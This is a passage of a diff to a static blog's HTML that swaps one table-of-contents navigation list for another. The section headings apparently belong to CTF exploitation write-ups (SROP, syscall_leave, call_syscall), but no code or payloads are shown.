+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#syscall-leave"><span class="nav-text">syscall_leave</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF"><span class="nav-text">思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%84%9A%E6%9C%AC"><span class="nav-text">脚本</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#call-syscall"><span class="nav-text">call_syscall</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF-1"><span class="nav-text">思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%84%9A%E6%9C%AC-1"><span class="nav-text">脚本</span></a></li></ol></li></ol>
     </div>
 </div>
 
@@ -679,7 +593,7 @@
             <div class="tablet-post-toc">
                 <div class="post-toc-wrap border-box">
     <div class="post-toc border-box">
-        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#scu"><span class="nav-text">scu</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B3%84%E9%9C%B2%E5%9C%B0%E5%9D%80"><span class="nav-text">泄露地址</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B0%83%E7%94%A8"><span class="nav-text">调用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%84%9A%E6%9C%AC"><span class="nav-text">脚本</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SROP"><span class="nav-text">SROP</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#SROP-%E6%94%BB%E5%87%BB%E7%9A%84%E5%8E%9F%E7%90%86"><span class="nav-text">SROP 攻击的原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%84%9A%E6%9C%AC-1"><span class="nav-text">脚本</span></a></li></ol></li></ol>
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#syscall-leave"><span class="nav-text">syscall_leave</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF"><span class="nav-text">思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%84%9A%E6%9C%AC"><span class="nav-text">脚本</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#call-syscall"><span class="nav-text">call_syscall</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF-1"><span class="nav-text">思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%84%9A%E6%9C%AC-1"><span class="nav-text">脚本</span></a></li></ol></li></ol>
     </div>
 </div>
 
